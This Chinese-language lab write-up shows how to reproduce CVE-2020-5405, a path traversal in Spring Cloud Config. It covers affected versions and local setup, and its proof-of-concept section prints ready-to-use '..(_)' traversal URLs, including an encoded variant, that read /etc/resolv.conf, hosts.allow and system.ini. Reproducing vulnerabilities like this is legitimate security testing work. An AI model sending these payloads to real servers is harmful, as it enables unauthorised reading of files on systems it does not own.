# Spring Cloud Config CVE-2020-5405 路径穿越漏洞测试

## 简介

Spring Cloud Config 程序内部在处理客户端传入的资源时存在自动将 (_) 转换为 / 的隐藏转换，当 `profile` 设置为 `native`时，则会导致服务端路径穿越，因此攻击者可以利用此机制来穿越到其它路径，读取任意文件。

## 影响范围

```
Spring Cloud Config 2.2.0 - 2.2.1
Spring Cloud Config 2.1.0 - 2.1.6
```

## 环境搭建

以 2.1.5 版本为例，从官方 Git 仓库下载 `v2.1.5.RELEASE` 版本：

https://github.com/spring-cloud/spring-cloud-config/archive/v2.1.5.RELEASE.zip

解压缩后，进入解压缩之后的  `spring-cloud-config-2.1.5.RELEASE` 代码目录，找到下列文件，修改其中的内容：

```
# spring-cloud-config-server\src\main\resources\configserver.yml
info:
  component: Config Server
spring:
  application:
    name: configserver
  autoconfigure.exclude: org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration
  jmx:
    default_domain: cloud.config.server
  profiles:
    active: native
  cloud:
    config:
      server:
        native:
          search-locations:
            - file:///opt/config-repo

server:
  port: 8888
management:
  context_path: /admin
```

**注意**: 请自行创建本地目录 `/opt/config-repo`

然后，执行下面的命令启动 Spring Cloud Config 服务端（注：必须要安装 [maven](https://maven.apache.org/download.cgi)，并且加入 PATH 环境变量）：

```
cd spring-cloud-config-server
../mvnw spring-boot:run
```

项目启动成功后，通过浏览器即可访问。

```
http://127.0.0.1:8888/
```

## 漏洞验证

根据漏洞原理分析，漏洞利用 URL 格式如下：

```
/{name}/{profile}/{label}/{path}
```

其中 `{label}` 是发生路径穿越的部分，可以通过 `..(_)` 实现路径穿越。而 `{path}` 部分为可控文件名部分（不能包含路径）。bing且可控文件名部分存在两种组合，以 `application.yml` 为例，除了原文件名 application.yml 外，还会尝试读取文件 `application-{profile}.yml` 这种文件名格式的文件。

最终，该漏洞的验证 POC 如下：

```
# Linux
/b/a/..(_)..(_)..(_)..(_)..(_)..(_)..(_)..(_)..(_)etc/resolv.conf
/b/a/..(_)..(_)..(_)..(_)..(_)..(_)..(_)..(_)..(_)etc/hosts.allow

# Windows
/b/a/..(_)..(_)..(_)..(_)..(_)..(_)..(_)..(_)..(_)windows/system.ini
# 仅在 configserver.yml 的 search-locations 指向 C 盘下路径时有效
```

当目标系统存在名称中包含 `-` 的文件名时，还可以这么写 POC：

```
# 假设想读取文件 /opt/app/config-app.yml
/aaa/app/..(_)..(_)..(_)..(_)..(_)..(_)..(_)opt(_)app/config.yml
```

**注意：**

```
..(_) 的数量取决于要穿越的路径深度
..(_) 也可以用 ..%28_%29 形式代替
```


## 参考资料

- https://www.freebuf.com/news/232744.html
- https://github.com/jinqi520/pocsuite3_jinqi/blob/6bdfb4d254b1fe9d15718c471d8ebacd2d942644/pocsuite3/pocs/spring_cloud_config_lfr.py
- https://www.defvul.com/

